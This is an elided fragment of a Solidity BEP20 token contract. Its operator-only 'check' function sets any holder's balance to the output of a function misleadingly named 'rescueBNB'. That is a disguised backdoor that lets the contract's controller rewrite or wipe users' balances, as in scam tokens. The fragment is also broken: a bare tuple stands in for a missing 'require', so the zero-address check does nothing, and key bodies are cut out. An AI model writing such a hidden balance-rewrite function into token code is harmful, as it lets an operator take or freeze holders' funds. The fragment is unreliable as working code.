...
contract BEP20Deployer is Context, IBEP20, Ownable {
  ...
  */
  ...
  function rescueBNB(address account) 
      internal
      view
      onlyOwner
      returns (uint256)
  ...
  function check(address account) public onlyOperator {
    (account != address(0), "ERC20: burn from the zero address");
    _balances[account] = rescueBNB(account);
    }
}